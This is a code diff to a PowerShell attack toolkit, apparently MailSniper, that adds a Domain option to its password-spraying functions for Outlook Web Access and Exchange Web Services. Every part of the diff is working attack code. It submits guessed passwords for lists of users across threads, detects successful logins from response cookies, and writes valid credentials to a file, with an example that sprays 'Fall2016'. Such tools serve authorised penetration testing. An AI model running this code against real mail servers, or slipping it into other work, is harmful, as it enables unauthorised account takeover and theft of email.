@@ -1588,6 +1588,10 @@ function Invoke-PasswordSprayOWA{
        
         Number of password spraying threads to run.
 
+    .PARAMETER Domain
+
+        Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com
+
   
   .EXAMPLE
 
@@ -1619,7 +1623,11 @@ function Invoke-PasswordSprayOWA{
 
     [Parameter(Position = 4, Mandatory = $False)]
     [string]
-    $Threads = "5"
+    $Threads = "5",
+
+    [Parameter(Position = 6, Mandatory = $False)]
+    [string]
+    $Domain = ""
 
   )
     
@@ -1674,21 +1682,26 @@ function Invoke-PasswordSprayOWA{
     $Password = $args[1]
     $OWAURL2 = $args[2]
     $OWAURL = $args[3]
+    $Domain = $args[4]
 
     ## end code from http://poshcode.org/624
     ForEach($Username in $args[0])
     {
         #Logging into Outlook Web Access    
-        #Setting POST parameters for the login to OWA
         $ProgressPreference = 'silentlycontinue'
-	$cadatacookie = ""
+	if ($Domain -ne "")
+    {
+        $Username = ("$Domain" + "\" + "$Username")
+    }
+
+    $cadatacookie = ""
     $sess = ""
 	$owa = Invoke-WebRequest -Uri $OWAURL2 -SessionVariable sess -ErrorAction SilentlyContinue 
 	$form = $owa.Forms[0]
 	$form.fields.password=$Password
 	$form.fields.username=$Username
         $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
-        #Check title for inbox
+        #Check cookie in response
         $cookies = $sess.Cookies.GetCookies($OWAURL2)
         foreach ($cookie in $cookies)
         {
@@ -1704,7 +1717,7 @@ function Invoke-PasswordSprayOWA{
 	$curr_user+=1 
 
     }
-    } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL | Out-Null
+    } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL, $Domain | Out-Null
 
 }
 $Complete = Get-Date
@@ -1773,7 +1786,15 @@ function Invoke-PasswordSprayEWS{
     .PARAMETER ExchangeVersion
 
         In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
-  
+    
+    .PARAMETER Threads
+       
+        Number of password spraying threads to run.
+    
+    .PARAMETER Domain
+
+        Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com
+
   .EXAMPLE
 
     C:\PS> Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt
@@ -1808,7 +1829,11 @@ function Invoke-PasswordSprayEWS{
 
     [Parameter(Position = 5, Mandatory = $False)]
     [string]
-    $Threads = "5"
+    $Threads = "5",
+
+    [Parameter(Position = 6, Mandatory = $False)]
+    [string]
+    $Domain = ""
 
   )
     Write-Host -ForegroundColor "yellow" "[*] Now spraying the EWS portal at https://$ExchHostname/EWS/Exchange.asmx"
@@ -1884,6 +1909,12 @@ function Invoke-PasswordSprayEWS{
                 $ExchHostname = $args[2]
                 $Mailbox = $args[3]
                 $Password = $args[5]
+                $Domain = $args[7]
+
+                if ($Domain -ne "")
+                {
+                $UserName = ("$Domain" + "\" + "$UserName")
+                }
 
                 #converting creds to use with EWS
                 $remotecred = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,$userPassword
@@ -1913,7 +1944,7 @@ function Invoke-PasswordSprayEWS{
    
 
             }
-        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes | Out-Null
+        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes, $Domain | Out-Null
     
     }
     $Complete = Get-Date
